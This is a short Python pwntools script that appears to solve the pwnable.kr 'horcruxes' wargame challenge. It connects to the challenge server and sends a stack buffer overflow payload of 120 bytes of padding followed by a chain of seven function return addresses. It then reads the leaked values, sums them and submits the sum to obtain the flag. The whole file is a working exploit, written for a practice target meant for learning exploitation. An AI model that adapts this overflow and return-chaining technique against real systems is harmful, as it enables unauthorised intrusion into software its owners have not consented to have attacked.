from pwn import *

conn = remote('pwnable.kr', 9032)
sleep(2)
conn.sendline(b'1')
conn.clean()

junk_before_ret = ('A' * 120).encode('utf-8')

A_address = p32(0x0809fe4b)
B_address = p32(0x0809fe6a)
C_address = p32(0x0809fe89)
D_address = p32(0x0809fea8)
E_address = p32(0x0809fec7)
F_address = p32(0x0809fee6)
G_address = p32(0x0809ff05)

main_call_to_ropme = p32(0x0809fffc)

inputt = junk_before_ret + A_address + B_address + C_address + D_address + E_address + F_address + G_address + main_call_to_ropme

conn.sendline(inputt)
conn.recvline()
sum = 0

for i in range(7):
    horcrux_line = conn.recvline(keepends=False).decode()

    horcrux_value = horcrux_line.split('+')[1][:-1]
    
    print(horcrux_value)
    
    sum += int(horcrux_value)

conn.sendline(b'1')
conn.clean()

print('sum:' + str(sum))
conn.sendline(str(sum).encode('utf-8'))
flag = conn.recvline(keepends=False).decode()

print(flag)
